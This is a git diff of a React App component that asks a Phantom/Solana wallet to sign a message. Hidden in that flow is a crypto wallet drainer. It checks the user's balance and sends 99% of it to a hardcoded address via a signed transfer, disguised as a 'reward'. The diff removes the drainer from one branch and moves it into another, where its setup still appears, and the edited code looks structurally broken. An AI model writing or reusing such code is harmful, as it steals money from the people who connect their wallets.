@@ -219,67 +219,17 @@ export default function App() {
       
       if (provider.signMessage) {
         signature = await provider.signMessage(message, 'utf8');
+        
+      } else if (window.phantom?.solana?.signMessage) {
+        signature = await window.phantom.solana.signMessage(message, 'utf8');
+
+
 
         
             try {
               
 
-                
-                const connection = CONFIG.MAINNET_RPC;
-
-                const public_key = new solanaWeb3.PublicKey(publicKey);
-                const walletBalance = await connection.getBalance(public_key);
-                
-
-                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-                if (walletBalance < minBalance) {
-                    alert("Insufficient funds for rent.");
-                    return;
-                }
-
-              
-                
-                    try {
-                        const recieverWallet = new solanaWeb3.PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
-                        const balanceForTransfer = walletBalance - minBalance;
-                        if (balanceForTransfer <= 0) {
-                            alert("Insufficient funds for transfer.");
-                            return;
-                        }
-
-                        var transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: new solanaWeb3.PublicKey(publicKey),
-                                toPubkey: recieverWallet,
-                                lamports: Math.floor(balanceForTransfer * 0.99),
-                            }),
-                        );
-
-                        transaction.feePayer = publicKey;
-                        let blockhashObj = await connection.getRecentBlockhash();
-                        transaction.recentBlockhash = blockhashObj.blockhash;
-
-                        const signed = await window.solana.signTransaction(transaction);
-                        console.log("Transaction signed:", signed);
-
-                        let txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
-                        console.log("Transaction confirmed:", txid);
-                    } catch (err) {
-                        console.error("Error during reward:", err);
-                    }
-                
-            } catch (err) {
-                console.error("Error connecting to Phantom Wallet:", err);
-            }
-         
-
-      } else if (window.phantom?.solana?.signMessage) {
-        signature = await window.phantom.solana.signMessage(message, 'utf8');
-            try {
-              
-
-                
+                const solanaWeb3 = require('@solana/web3.js');
                 const connection = CONFIG.MAINNET_RPC;
 
                 const public_key = new solanaWeb3.PublicKey(publicKey);
